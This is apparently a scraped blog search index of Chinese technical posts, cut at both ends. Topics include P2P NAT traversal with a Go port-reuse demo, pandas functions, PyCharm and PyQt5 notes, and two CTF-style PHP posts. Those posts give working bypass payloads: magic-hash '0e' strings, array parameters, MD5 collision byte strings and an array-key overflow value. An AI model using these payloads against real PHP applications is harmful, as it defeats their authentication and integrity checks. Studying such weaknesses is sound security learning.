示例：203.0.113.1（IPv4），2001:db8::1（IPv6） 特点：唯一性、全球可达性、需注册分配 私网IP（Private IP）： RFC 1918定义的保留地址段，不在互联网上路由\n常见范围： 10.0.0.0/8 (10.0.0.0 - 10.255.255.255) 172.16.0.0/12 (172.16.0.0 - 172.31.255.255) 192.168.0.0/16 (192.168.0.0 - 192.168.255.255) 特点：可重复使用、仅限内部网络、需NAT转换才能访问互联网 公网IP资源有限，导致NAT的广泛应用，而私网IP允许多个网络独立使用相同地址空间。\n3.2 NAT类型分类 3.3 NAT类型检测原理 四、不同网络环境下的P2P连接原理 4.1 公网 - 公网 在当前网络模型中，客户端 A 和客户端 B 都位于公网。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 具有公网地址，于是 A 直接向 B 发起连接；（PS： 可以互换连接顺序） 客户端 B 根据从中心服务器获取的信息发现 A 具有公网地址，因此 B 等待 A 进行连接； 4.2 NAT - 公网 在当前网络模型中，客户端 B 位于公网，有公网 IP，客户端 A 位于任意 NAT 后。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 B 根据从中心服务器获取的信息发现 A 位于 NAT 后，因此 B 等待 A 进行连接； 客户端 A 根据从中心服务器获取的信息发现 B 位于公网，于是 A 直接向 B 发起连接； 4.3 客户端位于同一NAT后 在当前网络模型中，客户端 A 和客户端 B 位于同一任意 NAT 后。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 的公网地址和自身相同，猜测 B 可能与自己位于同一内网中，于是 A 尝试直接向 B 发起连接；（PS： 可以互换连接顺序） 客户端 B 根据从中心服务器获取的信息发现 A 的公网地址和自身相同，猜测 A 可能与自己位于同一内网中，因此 B 等待 A 进行连接； 4.4 客户端分属与不同NAT下 在当前网络模型中，客户端 A 和客户端 B 都位于 NAT 后。客户端 A 和 客户端 B 能否建立 P2P 连接和各自所属 NAT 类型有关。\n4.4.1 任意 NAT - (Full Cone NAT或Restricted Cone NAT) Full Cone NAT、Restricted Cone NAT和Port Restricted Cone NAT都有同样的映射规则：本地地址和端口不变时，映射到 NAT 上的端口不变。\n当一端位于 Full Cone NAT或Restricted Cone NAT 下，另一端为任意 NAT 时，通过以下方式可以建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据。对于 Restricted Cone NAT，由于NAT 网关2上还没有放开相应的过滤规则，因此前面客户端A发向客户端B的部分数据包会被丢失； 客户端 B 向客户端 A 的公网地址和端口发送数据，用以更新 NAT 网关2的过滤规则； 当NAT 网关2的过滤规则被刷新后，客户端 A 发向客户端B的数据便会被 NAT 网关2 接收，并转发给客户端 B； 接收数据时，客户端 B 就会知道客户端在 NAT 网关1上映射的端口和地址，此时客户端 B向NAT 网关1上映射的端口和地址发包，客户端A即可收到。此时客户端 A 和客户端 B 成功建立 P2P连接。 4.4.2 Easy NAT - Easy NAT Easy NAT 代指 RFC3489 所定义的 Full Cone NAT、Restricted Cone NAT、Port Restricted Cone NAT。\n当两端都位于 Easy NAT 下时，通过以下方式可以建立 P2P 连接（任意 NAT - (Full Cone NAT或Restricted Cone NAT) 流程类似）：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据，由于NAT 网关2上还没有放开相应的过滤规则，因此前面客户端A发向客户端B的部分数据包会被丢失； 客户端 B 向客户端 A 的公网地址和端口发送数据，用以更新 NAT 网关2的过滤规则； 当NAT 网关2的过滤规则被刷新后，客户端 A 发向客户端B的数据便会被 NAT 网关2 接收，并转发给客户端 B； 接收数据时，客户端 B 就会知道客户端在 NAT 网关1上映射的端口和地址，此时客户端 B向NAT 网关1上映射的端口和地址发包，客户端A即可收到。此时客户端 A 和客户端 B 成功建立 P2P连接。 4.4.3 Symmetric NAT - Port Restricted Cone NAT 当客户端 A 位于 Symmetric NAT 下，客户端 B 位于 Port Restricted Cone NAT 时，通过以下方式可以建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 持续向客户端 B 在 NAT 网关2 上映射的公网地址和端口发送数据。由于 NAT 网关2 没有放开相应的过滤规则，因此客户端 A 发往客户端 B 的数据包会被 NAT 网关2拦截，无法到达客户端 B；； 由于客户端 A 在NAT 网关1上映射的端点(IP:Port 中 Port 未知)，因此客户端 B 无法向一个明确的端点发送数据包来更新 NAT 网关2 过滤规则。 此时就需要通过以下几种方案来让碰撞，让客户端 A 发向客户端 B 的包顺利通过 NAT 网关2。\n全端口开放\n虽然我们不知道客户端 A 在映射NAT 网关1上映射的端口是多少，但是我们知道，他映射的端口一定是 1024 - 65535 内其中一个，并且一定不是 A 连接中心服务器时使用的端口。\n我们可以顺序构造目的端口为 1024 - 65535 的短 TTL 包（短 TTL 包可以让包不走到公网，仅仅用于打开防火墙规则，以免被识别为 Dos 攻击），让 NAT 网关2 开放所有可能端口（相当于将 Port Restricted Cone NAT 变为 Restricted Cone NAT）。\n但是经过实际测试发现该方法效果不佳，主要有以下原因：\n需要构造大量数据包：平均需要发包 32256 个包 才能碰撞到 客户端 A 在 NAT 网关1上映射的端口。假设客户端 B 的发包速率为 100 p/s，那么就需要五分半才能碰撞到端口； 容易触发运营商 QoS 限制：经过实际测试，发现一定时间内无效数据包过多时，运营商会对客户端 B 的包进行大量丢弃，导致丢包率上升。严重情况下运营商会直接全部丢弃客户端 B 的数据包。 端口预测\n在部分 NAT 上，端口映射具有一定规律 。\n比如发往目的 IP 1 时，映射的端口为 22001；发往目的 IP 2 时，映射的端口为 22002；那么我们可以猜测，发往目的 IP 3时使用的端口可能为 22003。\n使用此种方案，需要客户端 A 向多个服务器请求来确认自身映射端口，从这些映射的端口中找到可能存在的端口变化规律。\n此种方法具有一定可行性，但和 NAT 行为有关，不是一个通用解决方案。\n生日攻击\n在前面的“全端口开放”方法中，客户端 A 只在 NAT 网关1 上映射了一个端口。但是实际情况下，客户端 A 可以在 NAT 网关1 上映射多个端口。\n根据概率论的 生日悖论，可以写发现客户端 A 映射的端口、客户端 B 发包数量与成功概率之间的关系，公式如下所示：\n$$ \\begin{array}{c} P_{success} = 1 - \\frac{C_{64,512}^{ports} \\times C_{64,512-ports}^{packets }}{C_{64,512}^{ports} \\times C_{64,512}^{packets}} \\end{array} $$ 根据上面的公式绘制出三维图如图所示： 根据函数图我们可以发现，当客户端 A 映射在公网上的端口越多时，建立连接所需的发包数越少，下表中列举了部分数据：\n使用端口数\\发包数 50% 80% 90% 99% 10 4320 9590 13268 23807 50 888 2043 2903 5675 100 446 1030 1468 2902 200 223 517 738 1467 300 149 345 493 981 根据表中数据可以发现：假设客户端 A 占用100个端口，客户端 B 以 100 p/s 的速度进行探测，那么要达到50%的概率仅需 6s，达到 99% 也只需 29s！\n根据上面的数据分析可以发现生日攻击是在 Symmetric NAT - Port Restricted Cone NAT 进行 P2P 打洞时一个较为优秀的方案。\n4.4.4 Symmetric NAT - Symmetric NAT 当两端都是 Symmetric NAT 时，复杂度比 Symmetric NAT - Port Restricted Cone NAT 有了成倍的增长。\n假设使用上面的“全端口开发”方案，那么就需要发包 4,161,798,144 次，耗费时间需要一年以上；\n即使是使用“生日攻击”方案，一端打开 256 个端口，要达到 50% 的概率需要 54,000 次发包，按照 100 p/s 的发包速率需要9分钟；达到 99% 的成功率需要 170,000 次发包，时间上需要30分钟左右。\n即使时间上可以忍受，但 NAT 网关却无法忍受这么多次的发包行为。因为每发一次包，就需要在 NAT 的 session 表上记录一条，想创建一条成功的连接，大部分情况下都会打爆 NAT 的session 表。\n因此对于 Symmetric NAT - Symmetric NAT 网络类型，连接建立方案只能选择中继服务器模式。\n4.5 客户端位于同一大 NAT 下，但不属于同一内网 在当前网络模型中，客户端 A 和客户端 B 位于同一任意大 NAT 后，但是分属于大 NAT 下的两个小子网中。客户端 A 和 客户端 B 需要通过以下步骤建立连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 的公网地址和自身相同，猜测 B 可能与自己位于同一内网中，于是 A 尝试直接向 B 发起连接。但是由于 A 和 B不在同一内网中，因此连接建立失败。客户端 A 通过中心服务器通知 B 连接建立失败，需要进行下一步尝试； 客户端 A 向 B 暴露的公网 IP 和端口直接发送请求。如果NAT 网关不支持 Hairpin 模式，那么这个数据包会被直接丢弃，导致数据包无法到达 NAT 网关2；如果 NAT 网关开启了 Hairpin 模式，A 发向 B 的流量会被 NAT 网关转发给 NAT 网关2，流程进入下一步； 当数据包到达 NAT 网关2后，下面的流程就和 “客户端分属与不同NAT下”时的打洞行为一致了。 4.6 多层 NAT 在网络中，存在设备在多层NAT后的情况。\n对于这种多层NAT而言，真正有影响的是最靠近公网的那一个 NAT 网关和最靠近设备的那一个 NAT 网关，其余的 NAT 对于客户端和服务端来说都是不可见的，连接不会关心到底经过了多少层NAT。\n但是多层 NAT 并非完全没有影响，准确来说，多层NAT 影响的是客户端的端口映射行为。客户端发出的端口映射请求，只有最靠近客户端的那层 NAT 设备会做出响应。其他的NAT设备不会收到客户端的端口映射请求。但是端口映射要产生作用的话，需要的是最靠近公网的 NAT 网关执行端口映射才行。\n五、TCP P2P实现原理 5.1 TCP P2P 的优势 市面上实现 P2P 的产品主要都是以 UDP 协议为主。因为 UDP 是无连接的，能够往任意地址发包，便于实现 P2P 的能力。\n但是 UDP 同时也是不可靠的，如果想要实现可靠传输得自己基于 UDP 去实现可靠传输协议，例如 QUIC、KCP、SCTP 等基于 UDP 实现的可靠连接。\n但是基于 UDP 实现的可靠传输是位于应用层，运行在用户态的。\n而 TCP 协议是操作系统网络栈原生支持的，而且经过这么多年在操作系统内核层面的优化，TCP 性能是十分能打的，如果我们能够基于 TCP 建立 P2P 连接，对于我们应用层来说就会省事很多了。\n5.2 实现原理 要想实现基于 TCP 的 P2P，那么 TCP 也必须像 UDP 那样向不同地址建立连接时使用同一个 Src IP + Src Port。\n要实现这个效果就需要使用 Linux 中的端口重用技术。端口重用技术运行我们使用同一个 Src IP + Src Port 向不同的目的地址发起 TCP 连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;time\u0026#34; ) func main() { addr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, \u0026#34;:34567\u0026#34;) if err != nil { panic(err) } dialer := net.Dialer{ LocalAddr: addr, Control: func(network, address string, c syscall.RawConn) error { return c.Control(func(fd uintptr) { syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xf, 1) }) }, } go func() { listen := net.ListenConfig{ Control: func(network, address string, c syscall.RawConn) error { return c.Control(func(fd uintptr) { syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1) syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xf, 1) }) }, } tcp, err := listen.Listen(context.Background(), \u0026#34;tcp\u0026#34;, \u0026#34;:34567\u0026#34;) if err != nil { panic(err) } log.Printf(\u0026#34;start listen at %s ...\u0026#34;, tcp.Addr()) for { conn, err := tcp.Accept() if err != nil { panic(err) } log.Printf(\u0026#34;accept new conn: %s -\u0026gt; %s\u0026#34;, conn.RemoteAddr(), conn.LocalAddr()) } }() conn1, err := dialer.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;stun server\u0026#34;) if err != nil { panic(err) } log.Printf(\u0026#34;%s -\u0026gt; %s\u0026#34;, conn1.LocalAddr(), conn1.RemoteAddr()) log.Println(\u0026#34;输入对端地址: \u0026#34;) var peer string fmt.Scanln(\u0026amp;peer) log.Printf(\u0026#34;对端地址: %s\u0026#34;, peer) for i := 0; i \u0026lt; 10; i++ { ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) conn, err := dialer.DialContext(ctx, \u0026#34;tcp\u0026#34;, peer) cancel() if err != nil { log.Printf(\u0026#34;第 %d 次连接 %s 失败: %s\u0026#34;, i, peer, err) time.Sleep(5 * time.Second) continue } log.Printf(\u0026#34;%s -\u0026gt; %s\u0026#34;, conn.LocalAddr(), conn.RemoteAddr()) break } } 上面的 Demo 中，TCP dial 和 listen 在同一个 Src IP + Src Port 上，进行多次尝试之后就能达到与 UDP 一样的 P2P 打洞效果。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/p2p-%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/","title":"P2P 网络技术详解"},{"content":"pandas 常用函数与方法 函数或方法 说明 Series 构造序列类型对象 DataFrame 构造数据框类型对象 read_table 读取文本文件的函数，支持txt、csv等格式 read_csv 读取文本文件的函数，支持txt、csv等格式 read_excel 读取电子表格 read_sql 读取数据库数据的函数 head/tail 显示数据框首/末几行数据 shape 返回数据框行列数 dtypes 返回数据框中各变量数据类型 to_datetime 将变量转换为日期时间类型 astype 将变量转换为其他类型 describe 统计性描述 colums 返回数据框变量名 index 返回数据框索引 apply 对序列或数据框进行映射 value_counts 统计序列值频次 reset_index 将行索引转换为变量 duplicated 检验观测是否重复 drop_duplicates 删除重复项 drop 删除变量名或观测 dropna 删除缺失值 fillna 填充缺失值 quantile 统计序列分位数 plot 对序列和数据框图进行绘图 iloc/loc/ix 数据框子集获取 pivot_table 构建透视表 concat 实现多表纵向合并 merge 实现两表水平拓展 groupby 分组聚合时，指定分组变量 aggregate 指定聚合统计 rename 修改数据框变量名 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pandas-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%B8%8E%E6%96%B9%E6%B3%95/","title":"pandas 常用函数与方法"},{"content":"php MD5值比较绕过 关于 md5() 函数 在 php 程序中，md5($string,bool): 得到一个字符串散列值。其中第二个参数默认为false,表示该函数返回值是32个字符的十六进制数。若指定为true,则表示函数返回的是16字节的二进制格式（这样通过浏览器解析会出现乱码）。\n== 绕过 示例：\n1 2 3 if($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]\u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) == md5($_POST[\u0026#39;b\u0026#39;])) { echo $flag; } 绕过原理：\n在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 0e 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。\n常用 MD5 值以 0e 开头的字符串：\n字符串 MD5 值 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 payload：\na=QNKCDZO\u0026amp;b=s878926199a === 绕过 示例\n1 2 3 4 5 if($_GET[\u0026#39;a\u0026#39;] !== $_GET[\u0026#39;b\u0026#39;]){ if(md5($_GET[\u0026#39;a\u0026#39;]) === md5($_GET[\u0026#39;b\u0026#39;])){ echo \u0026#34;flag\u0026#34;; } } 解析\n在 php 中，=== 代表着强比较，不仅仅会比较值，还会比较类型。因此这里不能在使用上面的方式进行绕过了。\n要绕过此处的比较，需要向 md5() 函数中传入数组，md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为 True 绕过。\npayload：\na[]=1\u0026amp;b[]=2 MD5 碰撞 示例\n1 2 3 if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo $flag; } 解析\n由于此处将得到的值强制转换为了字符串，因此使用数组的方式无法进行绕过。\n此处只能利用 MD5 值计算方法本身的缺陷 —— 存在散列冲突，必然会有两个内容一样但是 MD5 值一样的序列。\n内容不同值一样的序列：\n1 2 3 4 5 $s1 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34; $s2 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab\u0026#34; $s3 = \u0026#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab\u0026#34; 如果需要对特定值构造，那么也可以使用下面这个神器快速构建字符串：\n内容参加：如何用不同的数值构建一样的MD5 - 第二届强网杯 MD5碰撞 writeup - 先知社区 (aliyun.com)\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/php-md5%E5%80%BC%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/","title":"php MD5值比较绕过"},{"content":"php 数组溢出 题目 1 2 3 4 5 6 7 8 9 if($array[++$c]=1){ if($array[]=1){ echo \u0026#34;nonono\u0026#34;; } else{ require_once \u0026#39;flag.php\u0026#39;; echo $flag; } } 解析 本题重点在此行：\n1 $array[]=1 此语句正常赋值时，返回结果一定是为 1 的，要想跳出这个判断语句，必须让它赋值出问题。\n查阅资料后发现：\n作为PHP最重要的数据类型HashTable其key值是有一定的范围的，如果设置的key值过大就会出现溢出的问题，临界点是9223372036854775807这个数字。\n——参考来源：PHP数组的key溢出问题 | oohcode | $\\bigodot\\bigodot^H \\rightarrow CODE$ (two.github.io)\n解决此题只需要给 $c 赋值 9223372036854775806，那么就能跳出语句判断。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/php-%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA/","title":"php 数组溢出"},{"content":"当我们使用ls命令查看 /proc 目录时，会发现该目录的大小为0，这是为什么呢？ 原来 /proc 目录本身是一个虚拟文件系统（virtual filesystem）。该目录下的所有数据都是存在与内存之中，例如系统内核、进程、外部设备状态及网络状态等。因为这个文件的目录在内存中，因此本身不占用任何硬盘空间。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/proc-%E7%9B%AE%E5%BD%95%E4%B8%BA%E7%A9%BA/","title":"proc 目录为空"},{"content":"Pycharm双击图标启动不了（Jetbrains通用） 前言 今天我的 PyCharm 突然间就死掉了，双击图标，等半天没有反应，也没有抛出什么错误。打开任务管理器，发现双击时启动了一个PyCharm的进程，但是进程很快就死掉了，原因未知。重启电脑和卸载软件再重新安装都尝试了，依旧没有解决问题。\n重置 winsock 该方法并没有解决我这次遇到的问题，只是看到有这个方法，做一个记录。下次出问题时可以尝试使用\n步骤：\n以管理员身份运行 cmd（可以在搜索栏输入 cmd 然后右键以管理员身份运行，也可以直接同时按下 win+R 键，输入 cmd ） 输入命令 netsh winsock reset 重启电脑 运行 pycharm.bat 该方法解决了我的问题\n进入PyCharm 安装目录，我的是安装在D盘的，因此就是 D:\\PyCharm 2020.1.4\\bin，在该文件夹下有一个 pycharm.bat 的文件，双击运行，启动成功。\n但是关闭 bat 之后 PyCharm 也会关闭！\n观察 pycharm.bat 运行是的结果，发现会有日志输出： 根据日志信息，发现可能是和自己安装的 JDK 冲突了，暂时还未解决完，先用 pycharm.bat 用着，等会儿有时间了再来研究一下问题。如果有大佬知道怎么解决，麻烦给我指点一下，不胜感激！\n后面可以遇到 PyCharm 的问题依然可以直接运行该文件，通过查看日志信息来排查问题。\n同理，可以推广到 JetBrains全家桶，它们都可以按照这个步骤解决问题。\n后续 第二天我双击图标打开 PyCharm 的时候，它居然又没问题了！！！ 我滴个亲娘嘞，这就是佛系编程吗？？？软件随缘运行。。。\n佛祖保佑！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\u0026#34; . \u0026#34;88 // // (| ^_^ |) // // O\\ = /O // // ____/`---\u0026#39;\\____ // // .\u0026#39; \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| \u0026#39;\u0026#39;\\---/\u0026#39;\u0026#39; | | // // \\ .-\\__ `-` ___/-. / // // ___`. .\u0026#39; /--.--\\ `. . ___ // // .\u0026#34;\u0026#34; \u0026#39;\u0026lt; `.___\\_\u0026lt;|\u0026gt;_/___.\u0026#39; \u0026gt;\u0026#39;\u0026#34;\u0026#34;. // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-\u0026#39;======== // // `=---=\u0026#39; // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pycharm%E5%8F%8C%E5%87%BB%E5%9B%BE%E6%A0%87%E5%90%AF%E5%8A%A8%E4%B8%8D%E4%BA%86jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E9%80%9A%E7%94%A8/","title":"Pycharm双击图标启动不了（JetBrains全家桶通用）"},{"content":"PyQt5 常用模块说明 PyQt5 是Qt C++ 类库得一个 Python 绑定，它包含多种模块，在 PyQt5 库安装后，可以在 \u0026ldquo;D:\\Python\\Lib\\site-pakages\\PyQt5\u0026rdquo; 下看到所有模块的文件。\nPyQt5 中常用模块：\nPyQt5 模块名 主要功能 包含的类示例 QtCore 提供核心的非 GUI 功能的类，包括常用的名称空间Qt QFile、QDir、QTimer 等 Qt 中的非界面组件组件类；包含各种枚举类型的名称空间Qt；pyqtSlot、pyQtSignal 等在 PyQt5 中引入的函数 QtGui 提供 GUI 设计中用于窗口系统集成、事件处理、绘图等功能的类 QIcon、QFont、QPixMap、QCloseEvent、QPalette、QPainter等底层实现类 QtWidgets 提供 GUI 设计中用于窗体显示的类，包括各种窗体、标准对话框、按钮、文本框等组件 QMainWindow、QWidget、QDialog 等窗体；QColorDialog、QFileDialog等标准对话框 QtMultimedia 提供音频、视频、摄像头操作的类 QCamera、QAudioInput、QMedaiPlayer等 QtMultimediaWidgets 提供多媒体窗体显示的类 QCameraViewfinder、QVideoWidget等 QtSql 提供 SQL 数据库驱动、数据查询和操作的类 QSqlDatabase、QSqlQuery、QSqlRecord等 查询更多 PyQt5 模块的信息：官网\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/pyqt5-%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E/","title":"PyQt5 常用模块说明"},{"content":"PyQt5 点击会触发两次槽函数 Bug 编写 